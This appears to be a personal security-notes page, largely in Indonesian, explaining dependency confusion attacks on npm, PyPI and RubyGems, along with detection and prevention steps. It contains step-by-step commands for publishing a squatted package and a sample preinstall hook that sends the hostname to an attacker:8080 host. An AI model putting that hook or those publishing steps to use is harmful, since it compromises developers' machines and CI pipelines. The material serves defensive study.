---
title: "Dependency Confusion — Supply Chain Attack: Package Manager Exploitation, Detection, Defense"
tags:
  - cyber-security
  - supply-chain
  - dependency
  - npm
  - pip
  - library
aliases:
  - "Dependency Confusion Attack Guide"
  - "Package Name Squatting"
created: "2026-07-28"
updated: "2026-07-28"
status: pending
cssclasses:
  - wide-table
---

> [!info] Ringkasan
> Dependency Confusion (juga disebut Supply Chain Takeover) adalah serangan di mana attacker mempublikasikan package ke public registry (npm, PyPI, RubyGems) dengan nama yang sama dengan package internal perusahaan. Karena package manager mencari public registry ketika package tidak ditemukan di registry private, package jahat bisa terinstall. Dampak: RCE di server CI/CD, developer machine, atau production.

**Cross-link:** [[software-supply-chain-security-deepdive]] → [[dependency-confusion-supply-chain-attacks-praktik]] → [[devsecops-pipeline-sast-dast-sbom]]

---

## Daftar Isi

- [[#1. Mekanisme Dependency Confusion]]
- [[#2. Attack Vectors per Package Manager]]
- [[#3. Automated Exploitation Tools]]
- [[#4. Case Studies]]
- [[#5. Detection & Prevention]]
- [[#6. Referensi]]

---

## 1. Mekanisme Dependency Confusion

### Flow

```
1. Developer punya package internal: @company/auth-internal
2. Package ini TIDAK dipublish ke npm public — cuma di registry private
3. Attacker publish package dengan nama SAMA ke npm public: @company/auth-internal
4. CI/CD install dependencies → npm cek registry private → not found → fallback ke npm public → package JAHAT terinstall
5. Package jahat punya preinstall/postinstall script → RCE
```

### Resolusi Priority

| Package Manager | Priority                            |
| --------------- | ----------------------------------- |
| npm             | Private registry → Public npm       |
| pip             | PyPI → Custom index → PyPI fallback |
| gem             | Private gem server → RubyGems       |
| maven           | Internal repo → Maven Central       |
| NuGet           | Private feed → NuGet.org            |

---

## 2. Attack Vectors per Package Manager

### npm

```bash
# Step 1: Cari nama package internal
# Cek package.json, cari package yang tidak ada di npm public
cat package.json | grep "@company/"

# Step 2: Publish package jahat
npm init -y  # nama = @company/auth-internal
# Tambah preinstall script di package.json
echo "console.log('RCE!'); require('child_process').execSync('id')" > preinstall.js
npm publish

# Step 3: Tunggu CI/CD developer install → RCE
```

**Payload preinstall:**

```json
{
  "name": "@company/auth-internal",
  "version": "99.99.99",
  "scripts": {
    "preinstall": "node -e 'require(\"child_process\").execSync(\"curl http://attacker:8080/$(hostname)\")'"
  }
}
```

### PyPI

```bash
# Step 1: Cari package internal dari requirements.txt
# Step 2: Upload ke PyPI
python setup.py sdist upload -r pypi

# Or use twine
twine upload dist/*
```

### RubyGems

```bash
gem push malicious-package-0.0.1.gem
```

---

## 3. Automated Exploitation Tools

### Confused (npm/pip)

```bash
# Tool: https://github.com/visma-prodsec/confused
confused --project-url https://github.com/company/internal-project.git
# → scan dependencies, cek mana yang vulnerable
```

### Dependency Confusion Scanner

```bash
# Tool: dependency-confusion-scanner
python scanner.py --package-name @company/internal-pkg
```

---

## 4. Case Studies

| Year | Target          | Package Manager | Impact                                         |
| ---- | --------------- | --------------- | ---------------------------------------------- |
| 2021 | Microsoft (iOS) | CocoaPods       | Code execution via Podfile confusion           |
| 2022 | NPM ecosystem   | npm             | Ratusan package internal terdeteksi vulnerable |
| 2023 | PyPI            | pip             | Typosquatting packages                         |
| 2024 | Various         | npm             | Tool automasi scan + exploit massal            |

---

## 5. Detection & Prevention

### Detection

```bash
# Scan project dependencies
# Cek apakah ada package dengan nama yang ada di public registry
npm view @company/auth-internal  # Jika ada → VULNERABLE

# Automated scan via Confused
confused --project-dir .
```

### Prevention

| Strategy               | Implementasi                                       | Efektivitas   |
| ---------------------- | -------------------------------------------------- | ------------- |
| **Scoped packages**    | npm: `@company/*` di private registry              | Tinggi        |
| **Registry lock**      | `npm config set registry https://private-registry` | Tinggi        |
| **Package lock**       | Lockfile (`package-lock.json`, `yarn.lock`)        | Sedang        |
| **CI/CD verification** | Validasi asal package sebelum install              | Sangat tinggi |
| **SCOPE isolation**    | `@company/*` harus dari private, `*` dari public   | Sangat tinggi |
| **WAF/IDS**            | Deteksi download dari public registry              | Rendah        |

### npm Registry Lock

```bash
# .npmrc — pastikan package internal hanya dari private registry
@company:registry=https://npm.company.com/
# Package lain dari public
registry=https://registry.npmjs.org/
```

### CI/CD Verification

```yaml
# GitHub Action: cek dependency confusion sebelum install
- name: Check Dependency Confusion
  run: |
    npm view @company/auth-internal 2>/dev/null && echo "⚠️ VULNERABLE" && exit 1 || echo "✅ Safe"
```

---

## 6. Referensi

- PayloadsAllTheThings: `/mnt/data_d/Projects/Reference/PayloadsAllTheThings/Dependency Confusion/`
- OWASP: Dependency Confusion Attack

**Cross-link vault:**

- [[software-supply-chain-security-deepdive]] — supply chain
- [[dependency-confusion-supply-chain-attacks-praktik]] — praktik
- [[devsecops-pipeline-sast-dast-sbom]] — CI/CD security
- [[software-supply-chain-security]] — dasar
